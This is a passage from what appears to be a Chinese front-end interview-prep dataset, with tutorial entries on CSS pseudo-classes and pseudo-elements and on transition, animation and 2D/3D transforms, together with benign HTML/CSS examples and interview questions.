[⚠️](https://caniuse.com/?search=%3Afullscreen \"https://caniuse.com/?search=%3Afullscreen\") |\n| `:blank` | 输入框处于输入为空状态时 | ❌ |\n| `:dir()` | 匹配到特定文字书写方向时 | [❌](https://caniuse.com/?search=%3Adir \"https://caniuse.com/?search=%3Adir\") |\n\n上表中的兼容性表示：\n\n-   [✅](https://caniuse.com/?search=%3Aactive \"https://caniuse.com/?search=%3Aactive\") 代表主流浏览器都支持（至少 95% 以上）\n-   [❌](https://caniuse.com/?search=%3Anth-child \"https://caniuse.com/?search=%3Anth-child\") 代表大部分主浏览器都不支持（仅 20% 以下浏览器实现该特性）\n-   ⚠️ 代表部分浏览器支持（可能需要加前缀，例如 `:webkit-`或 `:-moz-`等）\n\n## 伪元素有哪些？\n\n与伪类相比，[伪元素](https://drafts.csswg.org/css-pseudo/ \"https://drafts.csswg.org/css-pseudo/\")就少很多了，常用的如下：\n\n| **伪元素** | **选中或创建出来的元素** | **兼容性** |\n| --- | --- | --- |\n| `::first-letter` | 选中块状元素中的首字母 | [✅](https://caniuse.com/?search=%3A%3Afirst-letter \"https://caniuse.com/?search=%3A%3Afirst-letter\") |\n| `::first-line` | 选中首行 | [✅](https://caniuse.com/?search=%3A%3Afirst-line \"https://caniuse.com/?search=%3A%3Afirst-line\") |\n| `::before` | 在之前创建一个不在文档树中的元素 | [✅](https://caniuse.com/?search=%3A%3Abefore \"https://caniuse.com/?search=%3A%3Abefore\") |\n| `::after` | 在之后创建一个不在文档树中的元素 | [✅](https://caniuse.com/?search=%3A%3Aafter \"https://caniuse.com/?search=%3A%3Aafter\") |\n| `::placeholder` | 选中表单元素的占位文本 | [✅](https://caniuse.com/?search=%3A%3Aplaceholder \"https://caniuse.com/?search=%3A%3Aplaceholder\") |\n| `::file-selector-button` | 选中类型为 file 的 input 里面的 button | [✅](https://caniuse.com/?search=%3A%3Afile-selector-button \"https://caniuse.com/?search=%3A%3Afile-selector-button\") |\n| `::selection` | 选中被用户高亮的部分 | [⚠️](https://caniuse.com/?search=%3A%3Aselection \"https://caniuse.com/?search=%3A%3Aselection\") |\n| `::backdrop` | 选中视觉聚焦元素后面的背景元素 | [⚠️](https://caniuse.com/?search=%3A%3Abackdrop \"https://caniuse.com/?search=%3A%3Abackdrop\") |\n| `::marker` | 选中 list 的 marker | [⚠️](https://caniuse.com/?search=%3A%3Amarker \"https://caniuse.com/?search=%3A%3Amarker\") |\n\n## 经典案例分析\n\n### 添加前缀/后缀\n\n伪元素最常用的技巧就是利用 `::before` 和 `::after`伪元素给某个元素添加前缀或后缀，例如简单的 DOM 结构：\n\n```html\n<div className=\"error-message\">系统异常，请稍后再试</div>\n```\n\n应用下面的 CSS 样式之后：\n\n```css\n.error-message {\n  position: relative;\n  color: #666666;\n  padding: 12px 30px;\n  background-color: #FFECE4;\n  border-radius: 5px;\n}\n\n.error-message::before {\n  content: '';\n  background-image: url('/public/icon-error.svg');\n  background-size: 15px;\n  position: absolute;\n  left: 10px;\n  display: inline-block;\n  width: 15px;\n  height: 15px;\n}\n```\n\n可以得到如下效果：\n\n![](https://static.ecool.fun//article/d58d7b0c-4654-4357-8b30-3b85b879ca8c.jpeg)\n\n> 注意：创建 `::before`和 `::after`的元素时，必须要设置 content 属性，否则就不存在了。另外宿主元素的 position 别忘记设置成 relative 或 absolute 了，否则布局可能会乱掉。\n\n虽然使用左右两个元素来布局也能实现上述效果，伪元素的优势是只需要创建一个元素即可。类似的场景还有在 input 输入框前面增加红色 require 星号。\n\n### 消息气泡\n\n我们在聊天时都会遇到带箭头的消息对话框，如下图所示：\n\n![](https://static.ecool.fun//article/b8b1622c-d81c-4fb3-8d6f-cc4fcdb76588.jpeg)\n\n实现上面布局也很简单，也是用的 `::before`和 `::after`伪元素，HTML 结构：\n\n```html\n<div className=\"container\">\n  <div className=\"box top-arrow\">Top </div>\n  <div className=\"box right-arrow\">Right</div>\n  <div className=\"box bottom-arrow\">Bottom</div>\n  <div className=\"box left-arrow\">Left</div>\n</div>\n```\n\nCSS 代码：\n\n```css\n.container {\n  display: grid;\n  grid-template-columns: 200px 200px;\n  grid-template-rows: 200px 200px;\n}\n\n.box {\n  width: 150px;\n  height: 100px;\n  background-color: red;\n  color: white;\n  position: relative;\n  border-radius: 20px;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  font-size: 16px;\n}\n\n.box::after {\n  content: '';\n  width: 0;\n  height: 0;\n  position: absolute;\n}\n\n.box.bottom-arrow::after {\n  border-left: 8px solid transparent;\n  border-right: 8px solid transparent;\n  border-bottom: 12px solid red;\n  left: 22px;\n  top: -10px;\n}\n\n.box.right-arrow::after {\n  border-top: 8px solid transparent;\n  border-bottom: 8px solid transparent;\n  border-right: 12px solid red;\n  top: 22px;\n  left: -10px;\n}\n\n.box.left-arrow::after {\n  border-top: 8px solid transparent;\n  border-bottom: 8px solid transparent;\n  border-left: 12px solid red;\n  top: 22px;\n  right: -10px;\n}\n\n.box.top-arrow::after {\n  border-left: 8px solid transparent;\n  border-right: 8px solid transparent;\n  border-top: 12px solid red;\n  left: 22px;\n  bottom: -10px;\n}\n```\n\n### 斑马条纹效果\n\n在一个列表中，为奇数行和偶数行显示不同的颜色，效果如下：\n\n![](https://static.ecool.fun//article/b216372b-9566-4524-911d-1d74595c77d1.jpeg)\n\nHTML 结构：\n\n```html\n<div class=\"container\">\n  <div>第1行</div>\n  <div>第2行</div>\n  <div>第3行</div>\n  <div>第4行</div>\n  <div>第5行</div>\n  <div>第6行</div>\n</div>\n```\n\nCSS 样式：\n\n```css\n.container {\n  width: 200px;\n  margin: 50px auto;\n  border: 1px solid antiquewhite;\n}\n\n.container div {\n  padding: 5px;\n}\n\n.container div:nth-child(even) {\n  background-color: antiquewhite;\n}\n```\n\n### 悬浮高亮效果\n\n在电商网站购物时，当用户鼠标悬浮在当前商品上面的时候，通过放大尺寸、增加阴影来突出显示，：\n\n![](https://static.ecool.fun//article/8a2a5d43-93d3-4244-a1ad-61ea682b58b2.jpeg)\n\nHTML 结构：\n\n```html\n<div class=\"container\">\n  <div class=\"product\"></div>\n  <div class=\"product\"></div>\n  <div class=\"product\"></div>\n</div>\n```\n\nCSS 样式：\n\n```css\nbody {\n  margin: 0;\n  background-color: rgb(245, 245, 245);\n}\n\n.container {\n  height: 200px;\n  width: 360px;\n  margin: auto;\n  display: flex;\n  justify-content: space-around;\n  align-items: center;\n}\n\n.product {\n  width: 100px;\n  height: 100px;\n  background: white;\n  background-image: url(//cdn.cnbj1.fds.api.mi-img.com/nr-pub/202207011841_084ed41d67f248677914605b73faf582.png?thumb=1&w=400&h=400&f=webp&q=90);\n  background-size: cover;\n}\n\n.product:hover {\n  box-shadow: 0 15px 30px rgb(0 0 0 / 10%);\n  transform: translate3d(0, -5px, 0) scale(1.2);\n  cursor: pointer;\n}\n```\n\n### 自定义复选框样式\n\n默认的复选框比较单调，利用伪类和伪元素配合，可以自定义 checkbox 样式，效果如下：\n\n![](https://static.ecool.fun//article/6ed399b5-2b71-46ad-a887-904c6a451f6f.jpeg)\n\nHTML 结构：\n\n```html\n<div className=\"container\">\n  <div>\n    <input type=\"checkbox\" id=\"backend\" />\n    <label htmlFor=\"backend\">后端开发</label>\n  </div>\n\n  <div>\n    <input type=\"checkbox\" id=\"backend\" />\n    <label htmlFor=\"backend\">后端开发</label>\n  </div>\n\n  <div>\n    <input type=\"checkbox\" id=\"frontend\" />\n    <label htmlFor=\"checkbox\">前端开发</label>\n  </div>\n\n  <div>\n    <input type=\"checkbox\" id=\"frontend\" />\n    <label htmlFor=\"checkbox\">前端开发</label>\n  </div>\n</div>\n```\n\nCSS 样式：\n\n```css\ninput[type=\"checkbox\"] {\n  margin: 0;\n}\n\n#frontend {\n  opacity: 0;\n}\n\n#frontend+label {\n  margin-left: -12px;\n  pointer-events: none;\n}\n\n#frontend+label::before {\n  content: '\\a0';\n  display: inline-block;\n  vertical-align: 0.1em;\n  width: 0.8em;\n  height: 0.8em;\n  border-radius: 0.2em;\n  background-color: silver;\n  text-indent: 0.15em;\n  line-height: 0.65;\n  cursor: pointer;\n}\n\n#frontend:checked+label::before {\n  content: '\\2713';\n  background-color: yellowgreen;\n}\n```\n\n### 自定义滚动条样式\n\n浏览器自带的滚动条样式非常单一，不够美观，我们可以利用伪元素和伪类自定义一个滚动条，将其背景颜色改成淡灰，宽度为 6px，当鼠标悬浮上去之后宽度变为 10px。\n\n![](https://static.ecool.fun//article/c83cfaa1-3526-416e-8bbf-b414df982ff8.jpeg)\n\nHTML 结构：\n\n```html\n<div class=\"container\">\n  <div class=\"rect\">\n    <div class=\"box\"></div>\n  </div>\n  <div class=\"rect2\">\n    <div class=\"box\"></div>\n  </div>\n</div>\n```\n\nCSS 样式：\n\n```css\n.container {\n  display: flex;\n  justify-content: space-around;\n}\n\n.rect,\n.rect2 {\n  width: 200px;\n  height: 200px;\n  overflow: scroll;\n  border: 1px solid gainsboro;\n}\n\n.rect2::-webkit-scrollbar {\n  width: 10px;\n  height: 0;\n  background-color: transparent;\n}\n\n.rect2::-webkit-scrollbar-thumb {\n  background-color: rgba(0, 0, 0, 0.08);\n  border-left: 4px solid transparent;\n  background-clip: padding-box;\n}\n\n.rect2::-webkit-scrollbar-thumb:hover {\n  background-color: rgba(0, 0, 0, 0.08);\n  border: 0;\n}\n\n.box {\n  width: 100px;\n  height: 300px;\n  background-color: aliceblue;\n}\n```\n> 原文：https://juejin.cn/post/7136087057542086693",
    "testPoint": "### 1. **伪类的基本概念**\n   - 你能解释什么是伪类吗？它如何在 CSS 中使用？\n   - 请列举一些常见的伪类并简要说明它们的作用，比如 `:hover`、`:focus`、`:nth-child()` 等。\n\n### 2. **伪类的工作原理**\n   - 伪类是如何与元素的状态相关联的？比如，`:hover` 伪类是如何工作的？\n   - 你能举个例子，说明如何使用伪类来控制交互效果，比如鼠标悬停时的样式变化？\n\n### 3. **常见伪类及其用法**\n   - `:nth-child()` 和 `:nth-of-type()` 的区别是什么？它们分别适用于什么样的场景？\n   - 如何使用 `:not()` 伪类选择元素，举个实际应用的例子。\n   - `:first-child` 和 `:last-child` 伪类有何作用？它们通常在哪些场景下使用？\n\n### 4. **伪元素的基本概念**\n   - 你能解释什么是伪元素吗？它如何与伪类不同？\n   - 请列举一些常见的伪元素并简要说明它们的作用，比如 `::before`、`::after`。\n\n### 5. **伪元素的应用**\n   - `::before` 和 `::after` 伪元素通常用于什么样的场景？举个实际的例子说明它们的使用方法。\n   - 你如何利用伪元素在不修改 HTML 结构的情况下，添加内容或样式？\n\n### 6. **伪类与伪元素的语法区别**\n   - 请解释伪类和伪元素的语法差异。例如，为什么伪元素使用 `::`（双冒号）而伪类使用 `:`（单冒号）？\n   - 在早期版本的 CSS 中，伪元素也使用单冒号（`:before`、`:after`）。目前的规范推荐使用双冒号，为什么会有这样的变化？\n\n### 7. **伪类与伪元素的组合使用**\n   - 你如何结合使用伪类和伪元素来创建复杂的效果？例如，在某个元素的 `hover` 状态下，利用 `::before` 来显示额外的内容。\n   - 你能举例说明如何使用 `:hover` 伪类与 `::after` 伪元素一起创建动态的交互效果吗？\n\n### 8. **浏览器兼容性与性能**\n   - 伪类和伪元素的兼容性如何？你在使用这些特性时，是否有遇到过浏览器兼容性问题？\n   - 你如何优化伪类和伪元素的使用，避免影响性能，特别是在大型项目中？\n\n### 9. **实际项目中的应用**\n   - 请分享你在实际项目中如何使用伪类和伪元素来改善用户体验或提升界面效果。\n   - 你是否曾经遇到过伪类或伪元素在复杂布局中引起问题的情况？你是如何解决的？",
    "exerciseKeyList": "[\"efc1bdba-4ded-4d08-846c-cc98cd1d0d58\",\"a180397f-7b8e-421f-964e-ed97bdd57efd\",\"ec2aa05e-da02-4a15-9862-9eaee4aa54e5\"]",
    "vipLimit": 0,
    "level": 1,
    "pointOrder": 1,
    "createAt": "2024-10-08T09:46:39.000Z",
    "updateAt": "2024-11-10T05:41:07.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "a180397f-7b8e-421f-964e-ed97bdd57efd",
        "title": "CSS3新增伪类有那些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T09:38:17.000Z",
        "updateAt": "2021-07-04T19:23:58.000Z"
      },
      {
        "exerciseKey": "ec2aa05e-da02-4a15-9862-9eaee4aa54e5",
        "title": "::before 和 :after中双冒号和单冒号有什么区别？解释一下这2个伪元素的作用",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:25:37.000Z",
        "updateAt": "2021-07-04T19:24:19.000Z"
      },
      {
        "exerciseKey": "efc1bdba-4ded-4d08-846c-cc98cd1d0d58",
        "title": "CSS 伪类和伪元素有哪些，它们的区别和实际应用",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T23:21:34.000Z"
      }
    ]
  },
  "117": {
    "id": 117,
    "tagId": 11,
    "title": "动画",
    "explanation": "# 前言\n\nCSS中有几个特别相近的几个属性。他们是`transition`,`transform`,`animation`。可能还有人对`translate`是什么也不清楚，那我们先给个简单的介绍。\n\n| 属性 | 含义 |\n| --- | --- |\n| transition 过渡 | 用于设置元素的样式过度，和animation有着类似的效果，但细节上有很大的不同 |\n| transform 变形 | 用于元素进行旋转、缩放、移动或倾斜，和设置样式的动画并没有什么关系，就相当于color一样用来设置元素的“外表” |\n| animation 动画 | css动画属性 |\n| translate 移动 | 只是transform的一个属性值，即移动。 |\n\n# transition 过渡\n\n字面意思上来讲，就是元素从这个属性(color)的某个值(red)过渡到这个属性(color)的另外一个值(green)，这是一个状态的转变，需要一种条件来触发这种转变，比如我们平时用到的:hoever、:focus、:checked、媒体查询或者JavaScript。\n\n> 一条transition规则，是可以定义多个属性的变化的，中间用逗号隔开，如果是全部属性变化则用“all”即可。\n\n语法：**`transition: property duration timing-function delay;`**\n\n| 值 | 描述 |\n| --- | --- |\n| transition-property | 规定设置过渡效果的 CSS 属性的名称 |\n| transition-duration | 规定完成过渡效果需要多少秒或毫秒 |\n| transition-timing-function | 规定速度效果的速度曲线 |\n| transition-delay | 定义过渡效果何时开始 |\n\n我发现简写时候的顺序并不一定就是写死的，经过测试在chrome上只要delay在duration后面即可。当然按照标准写是最好的。\n\n## Demo\n\n```bash\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <title>transition</title>\n  <style>\n    #box {\n      height: 100px;\n      width: 100px;\n      background: green;\n      transition: transform 1s ease-in 1s;\n    }\n\n    #box:hover {\n      transform: rotate(180deg) scale(.5, .5);\n    }\n  </style>\n</head>\n<body>\n  <div id=\"box\"></div>\n</body>\n</html>\n```\n\n效果\n\n![](https://static.ecool.fun//article/3d093e5f-5371-40e8-b777-e263ae197b5c.png)\n\n我们来分析这一整个过程，首先transition给元素设置的过渡属性是transform，当鼠标移入元素时，元素的transform发生变化，那么这个时候就触发了transition，产生了动画，当鼠标移出时，transform又发生变化，这个时候还是会触发transition，产生动画，所以transition产生动画的条件是transition设置的property发生变化，这种动画的特点是需要“一个驱动力去触发”，有着以下几个不足：\n\n1.  需要事件触发，所以没法在网页加载时自动发生\n2.  是一次性的，不能重复发生，除非一再触发\n3.  只能定义开始状态和结束状态，不能定义中间状态，也就是说只有两个状态\n\n# animation 动画\n\n弥补了transition的很多不足，可操作性更强，能够做出复杂酷炫的效果\n\n语法：**`animation: name duration timing-function delay iteration-count direction play-state fill-mode;`**\n\n| 值 | 描述 |\n| --- | --- |\n| @keyframes | 规定动画 |\n| animation | 所有动画属性的简写属性，除了 animation-play-state 属性 |\n| animation-name | 用来调用@keyframes定义好的动画，与@keyframes定义的动画名称一致 |\n| animation-duration | 规定动画完成一个周期所花费的秒。默认是 0 |\n| animation-timing-function | 规定动画的速度曲线。默认是 \"ease\" |\n| animation-delay | 规定动画何时开始。默认是 0 |\n| animation-iteration-count | 规定动画被播放的次数。默认是 1 |\n| animation-direction | normal(按时间轴顺序),reverse(时间轴反方向运行),alternate(轮流，即来回往复进行),alternate-reverse(动画先反运行再正方向运行，并持续交替运行) |\n| animation-play-state | 控制元素动画的播放状态，通过此来控制动画的暂停和继续，两个值：running(继续)，paused(暂停) |\n| animation-fill-mode | 控制动画结束后，元素的样式，有四个值：none(回到动画没开始时的状态)，forwards(动画结束后动画停留在结束状态)，backwords(动画回到第一帧的状态)，both(根据animation-direction轮流应用forwards和backwards规则)，注意与iteration-count不要冲突(动画执行无限次) |\n\n比如我们一个 div 旋转一圈，只需要定义开始和结束两帧即可：\n\n```bash\n@keyframes rotate{\n  from{\n    transform: rotate(0deg);\n  }\n  to{\n    transform: rotate(360deg);\n  }\n}\n```\n\n等价于\n\n```bash\n@keyframes rotate{\n  0%{\n    transform: rotate(0deg);\n  }\n  100%{\n    transform: rotate(360deg);\n  }\n}\n```\n\n定义好了关键帧后，下来就可以直接用它了：\n\n```bash\nanimation: rotate 2s;\n```\n\n> Tips: `transition`和`animation`的`timing-function`可以用贝塞尔曲线(`cubic-bezier`)来自定义，[工具网站](https://cubic-bezier.com/ \"https://cubic-bezier.com/\")\n\n# transform 变形\n\ntransform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。\n\n语法：**`transform: none|transform-functions;`**\n\ntransform 可以设置多个变换，执行顺序是从左到右执行，中间不用逗号隔开。例如：\n\n```bash\ntransform: translateX(100px) rotate(90deg);\n```\n\n**这部分内容分为三个小结：前置属性、2D变换、3D变换**\n\n## 前置属性讲解\n\n| 值 | 描述 |\n| --- | --- |\n| transform-origin | 用于指定元素变形的中心点 |\n| transform-style | 指定舞台为2D或3D |\n| perspective | 指定3D的视距 |\n| perspective-origin | 视距的基点 |\n| backface-visibility | 是否可以看见3D舞台背面 |\n\n### transform-origin\n\n用于指定元素变形的中心点。默认中心点就是元素的正中心，即XYZ轴的50% 50% 0处。可以通过该属性改变元素在XYZ轴的中心点，正值表示正向位移，负值表示负向位移。（XYZ轴的正向分别是往右，往下，靠近用户眼睛。反之为反向）\n\n表示2维的`x-offset/y-offset`可以设`px`值也可以设`%`百分比，也可设`top / right / bottom / left / center`等`keyword`。表示3维的`z-offset`只能设`px`值，不能设`%`百分比，也没有`keyword`。\n\n默认中心点在元素正中心，因此关键字`top`等价于`top center`等价于`50% 0%`（x轴仍旧留在50%处，y轴位移到0%处）。同理各关键字例如`right`等价于`right center`等价于`100% 50%`，不多赘述。\n\n一图胜千言：为图片设置不同的中心点后，看它们旋转，扭曲，缩放的效果。例如图1表头的第一行`center`表示`transform-origin: center`。第二行`rotate(30deg);`表示`transform: rotate(30deg);`。\n\n![](https://static.ecool.fun//article/00cfcbd9-53be-4878-aced-64416c5a0ce2.png)\n\n### transform-style\n\n这个属性比较简单只有两个值`flat`和`preserve-3d`。用于指定舞台为2D或3D，默认值flat表示2D舞台，所有子元素2D层面展现。preserve-3d看名字就知道了表示3D舞台，所有子元素在3D层面展现。注意，在变形元素自身上指定该属性是没有用的，它用于指定舞台，所以要在变形元素的父元素上设置该属性。设定后，所有子元素共享该舞台。一图胜千言：\n\n![](https://static.ecool.fun//article/2b2eec8f-8e8d-4954-8c4a-fab96730cdde.png)\n\n```bash\n.div1 {\n    float: left;\n    background-color: red;\n    transform: perspective(200px) rotateY(45deg);\n}\n.div1 img{\n    transform: translateZ(16px);\n}\n.p3d {\n    transform-style: preserve-3d;\n}\n<div class=\"div1\"><img src=\"head75.png\" /></div>\n<div class=\"div1 p3d\"><img src=\"head75.png\" /></div>\n```\n\n### perspective\n\n指定3D的视距。默认值是none表示无3D效果，即2D扁平化。上面例子代码里其实已经用到过该属性了。介绍它之前，先借用rotateX / rotateY / rotateZ来明确一下xyz轴坐标的基本概念。一图胜千言，依次是rotateX轴旋转，rotateY轴旋转，rotateZ轴旋转：\n\n![](https://static.ecool.fun//article/fe8b1a9a-5691-4212-86ed-80dca32d19a5.png)\n\n```bash\n.x {\n    transform: perspective(200px) rotateX(60deg);\n}\n.y {\n    transform: perspective(200px) rotateY(60deg);\n}\n.z {\n    transform: perspective(200px) rotateZ(60deg);\n}\n<img class=\"x\" src=\"head75.png\" />\n<img class=\"y\" src=\"head75.png\" />\n<img class=\"z\" src=\"head75.png\" />\n```\n\n实现3D的关键就是要有`perspective`视距，如果将上述代码中`perspective(200px)`去掉，效果如下：\n\n![](https://static.ecool.fun//article/7b93e394-19ab-42ac-a7b6-5bdb21dd405c.png)\n\n除了z轴旋转不受影响外，xy轴虽然还在旋转，但失去了3D效果，是2D扁平化的旋转。原因就是因为不设`perspective`的话，其默认值为none，没有视距没有3D。\n\n`perspective`只能设`px`值，不能设`%`百分比。值越小表示用户眼睛距离屏幕越近，相当于创建一个较大的3D舞台。反之，值越大表示用户眼睛距离屏幕越远，相当于创建一个较小的3D舞台。这很容易理解，离的越近东西看起来越大，离的越远东西看起来越小。但具体该怎么设呢？借用W3C的图配合translateZ来帮助理解视距。\n\n![](https://static.ecool.fun//article/467349b3-aa24-4b4f-8606-603c8115cbe9.png)\n\n上图中Drawing Surface就是最终会被渲染的大小\n\n图中d就是`perspective`视距，Z就是`translateZ`轴的位移。Z轴正向位移时，3D舞台将放大。反之，Z轴负向位移时，3D舞台将缩小。上图Z是d的一半，因此3D舞台上的元素将是原来的2倍。下图Z同样是d的一半，但由于是负值，所以3D舞台上的元素将缩小三分之一。实际试试：\n\n![](https://static.ecool.fun//article/38c12270-752e-4ba4-8e81-42977000dd6c.png)\n\n```bash\n.divsp {\n    display: inline-block;\n    border: 1px blue dashed;\n    margin-left: 30px;\n    perspective: 100px;\n}\n.z1 {\n    transform: translateZ(-75px);\n}\n.z2 {\n    transform: translateZ(0px);\n}\n.z3 {\n    transform: translateZ(25px);\n}\n.z4 {\n    transform: translateZ(101px);\n}\n<div class=\"divsp\"><img class=\"z1\" src=\"head75.png\" /></div>\n<div class=\"divsp\"><img class=\"z2\" src=\"head75.png\" /></div>\n<div class=\"divsp\"><img class=\"z3\" src=\"head75.png\" /></div>\n<div class=\"divsp\"><img class=\"z4\" src=\"head75.png\" /></div>\n```\n\n4张图的视距都是100px，表示4张图的3D舞台距离你的眼睛`100px`。我们从右往左来理解。图4的`translateZ(101px)`看到图片消失了，因为3D舞台距离你眼睛`100px`，而图片从舞台往Z轴正向位移`101px`，图片到了你脑袋后面自然什么都看不见。如果设成`translateZ(100px)`，相当于图片紧贴着你的眼睛，所以全屏都是图片。图3的`translateZ(25px)`，原始图片为`75px`，放大后的图片为`100px`。这是道初中数学题，你可以画一个底边是`75px`（图片原始尺寸），高是`75px`（视距100px-Z轴位移25px=75px）的等腰三角形，然后高扩展到`100px`，底边将等比例扩大3分之1至`100px`。图2的`translateZ(0px)`表示Z轴没有位移，因此仍旧是原始大小。图4的`translateZ(-75px)`，同样是道初中数学题，原始图片为75px，缩小到42.85px，再看看上面W3C的图理解一下，很容易算出来。\n\n仔细看代码的可以看出来，上面介绍XYZ轴旋转时是直接在变形元素`img`上指定的`transform: perspective(200px) rotateX(60deg);`。而上面的代码是给变形元素`img`的父`div`指定`perspective: 100px;`。你可以理解为前一种方式是`perspective()`函数，后一种方式是`perspective`属性。两种指定方式是有区别的：\n\n前者`perspective()`函数指定只针对当前变形元素，需要和`transform`其他函数一起使用，仅表示当前变形元素的视距。 后者`perspective`属性指定用于3D舞台，即3D舞台的视距，里面的子元素共享这个视距\n\n### perspective-origin\n\n设置视距的基点，看W3C的图就能明白\n\n![](https://static.ecool.fun//article/ff75fefe-89e7-4e2e-a99f-b755f6c5cac5.png)\n\n基点默认值是50% 50%即center，表示视距基点在中心点不进行任何位移。你可以让基点在XY轴上进行位移，产生上图那样的效果。注意该属性同样应该定义在父元素上，适用于整个3D舞台。它需要和`perspective`属性结合着一起用。效果如下图：\n\n![](https://static.ecool.fun//article/f6ac6cf0-82b7-4685-8017-0af978217bf3.png)\n\n```bash\n.td1 { \n    transform-style: preserve-3d;\n    perspective: 200px;\n    perspective-origin: center;\n}\n```\n\n### backface-visibility\n\n用于是否可以看见3D舞台背面，默认值visible表示背面可见，可以设成hidden让背面不可见。通常当旋转时，如果不希望背面显示出来，该属性就很有用，设成hidden即可。一图胜千言：\n\n![](https://static.ecool.fun//article/68cb2346-5243-4f2e-a92f-b97e59c5f9bc.png)\n\n```bash\n.stage{\n    float: left;\n    margin: 5px;\n    perspective: 200px;\n}\n.container {\n    transform-style: preserve-3d;\n}\n.image {\n    backface-visibility: hidden;\n}\n.front {\n    position: absolute;\n    z-index: 1;\n}\n.back {\n    transform: rotateY(180deg);\n}\n.stage:nth-child(1) .container{ transform: rotateY(0deg); }\n.stage:nth-child(2) .container{ transform: rotateY(30deg); }\n.stage:nth-child(3) .container{ transform: rotateY(60deg); }\n.stage:nth-child(4) .container{ transform: rotateY(90deg); }\n.stage:nth-child(5) .container{ transform: rotateY(120deg); }\n.stage:nth-child(6) .container{ transform: rotateY(150deg); }\n.stage:nth-child(7) .container{ transform: rotateY(180deg); }\n\n<div class=\"stage\"> //为节约篇幅该DOM请无脑复制7个\n    <div class=\"container\">\n        <img class=\"image front\" src=\"head75.png\" />\n        <img class=\"image back\" src=\"bg75.png\" />\n    </div>\n</div>\n```\n\n至此5个前置属性介绍完毕。它们多用于3D场合，因此常见的3D的HTML结构如下：\n\n```bash\n<舞台>        //为舞台加上perspective\n    <容器>     //为容器加上preserve-3d，使容器内元素共享同一个3D渲染环境\n        <元素> //为元素加上transform效果\n    </容器>\n</舞台>\n```\n\n## 2D变形\n\n| 值 | 描述 |\n| --- | --- |\n| translate | 设置元素在 X轴或者 Y轴上的平移变换 |\n| scale | 设置元素在 X轴或者 Y轴上的缩放 |\n| rotate | 二维空间中，rotate即围绕屏幕法向量旋转，等同于 rotateZ |\n| skew | 设置 X轴和 Y轴的倾斜角度 |\n| matrix | 定义 2D 转换，使用六个值的矩阵 |\n\n> `rotate/translate/screw` 等都可以直接通过设置 `Matrix` 来达到同样的效果\n\n### translate位移\n\ntranslate位移系列中用于2D的有：`translate`，`translateX`，`translateY`  \n设单值表示只X轴位移，Y轴坐标不变\n\n#### 示例\n\n`transform: translate(100px);`等价于`transform: translate(100px,0)`  \n`transform: translateY(100px);`等价于`transform: translate(0, 100px);`\n\n> 上面说了效果类似于`position:relative`属性，但和`position`语义不同，`position`用于页面布局，而`translate`属于`transform`中的一个系列，用于元素变形。你可能觉得语义不同有什么卵用，效果OK不就行了？就看你用什么标准来衡量效果了。CSS的神奇之处在于你可以将一个属性用在完全违背它原意的场景下，抛开代码可读性不谈，违背原意有时还是会有细微差别的。如结合动画效果时，`translate`能小于`1px`过渡，因此动画效果更为平滑。但`position`最小单位就是`1px`，动画效果肯定打折扣。另外用`translate`实现动画时，可以使用`GPU`，动画的`FPS`更高，而`position`显然无法享受这个优势。其他如回流和重绘也都有差异。因此如果你在该用`translate`的地方用了`position`，今后一些需求变动达不到要求，你也没什么立场可抱怨的了。\n\n### scale缩放\n\nscale缩放系列中用于2D的有：scale，scaleX，scaleY\n\n![](https://static.ecool.fun//article/87285561-2953-4131-9527-0983335d3572.png)\n\nw3cschool上没说的是，scale还能设负数，负数会先将元素反转再缩放，如transform: scale(-.5, -1.5);，效果见上面右图。为何反转能理解吧？XY轴像素矩阵各值取反后，效果等价于反转。当然你同样可以用rotate实现反转。\n\n### rotate旋转\n\nrotate旋转系列中用于2D的有：rotate\n\nrotate旋转，比较简单，只能设单值。正数表示顺时针旋转，负数表示逆时针旋转。如`transform: rotate(30deg);`\n\n### skew扭曲\n\nskew扭曲系列中用于2D的有：skew，skewX，skewY\n\nskew扭曲可以设单值和双值。单值时表示只X轴扭曲，Y轴不变，如`transform: skew(30deg);`等价于`transform: skew(30deg, 0);`。考虑到可读性，不推荐用单值，应该用`transform: skewX(30deg);`。\n\n### matrix矩阵\n\n-   3x3 的变换矩阵\n    \n    ![](https://static.ecool.fun//article/871f0d05-51c7-499a-aa84-a46134f7012f.png)\n    \n-   对二维向量进行转换\n    \n    ![](https://static.ecool.fun//article/a18a6316-cc5e-4969-a789-720f710e5de1.png)\n    \n    其中 x1、y1 为经过 Matrix 转换后的向量。由公式可知，Matrix 中 `e, f` 主要用于设置元素在 X轴和 Y轴上的平移。`a, d` 主要用于设置元素在 X轴和 Y轴上的缩放。`a,b,c,d` 用于设置元素在 XY 平面上的旋转。`rotate/translate/screw` 等都可以直接通过设置 `Matrix` 来达到同样的效果\n\n## 3D变形\n\n| 值 | 描述 |\n| --- | --- |\n| translate3d | 3D位移 |\n| scale3d | 3D缩放 |\n| rotate3d | 3D旋转 |\n| matrix3d | 3D矩阵变换 |\n\n### translate3d位移\n\ntranslate3d位移系列中用于3D的有：`translate3d`，`translateZ`\n\ntranslate3d(tx,ty,tz)，其中tz的Z轴长度只能为px值，不能为%百分比\n\n### scale3d缩放\n\nscale3d缩放系列中用于3D的有：`scale3d`，`scaleZ`\n\n`scale3d(sx,sy,sz)`，其中sz为Z轴的缩放比例，取值同sx，sy一样，在0.01～0.99时元素缩小，1时大小不变，大于1时元素变大。`scaleZ`等价于`scale(1,1,sz)`。需要注意的是单独使用`scale3d`或`scaleZ`不会有任何效果，需要配合其他属性在3D舞台上才能出现效果，否则Z轴的缩放比例根本无法定义。\n\n### rotate3d旋转\n\nrotate3d旋转系列中用于3D的有：`rotate3d`，`rotateX`，`rotateY`，`rotateZ`\n\n`rotate3d(x,y,z,a)`这里多了一个参数a（读音是阿尔法…）表示3D舞台上旋转的角度，而xyz的取值为0～1为各轴的旋转矢量值。\n\n### matrix3d矩阵\n\n最后`matrix3d`矩阵是所有3D变形的本质，上面所有3D变形效果都可以用`matrix3d`矩阵来实现。\n\n* * *\n\n\n\n> 原文：https://juejin.cn/post/6844904145544019982\n\n",
